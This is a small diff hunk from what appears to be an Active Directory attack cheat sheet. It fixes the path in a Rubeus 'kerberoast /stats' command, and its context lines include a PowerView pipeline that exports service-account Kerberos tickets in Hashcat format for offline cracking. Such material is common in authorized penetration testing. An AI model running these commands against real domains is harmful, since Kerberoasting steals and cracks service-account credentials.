@@ -167,7 +167,7 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\FileN
 Gather stats:
 
 ```powershell
- \Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /stats
 ```
 
 Request tickets with admincount attribute set to 1:
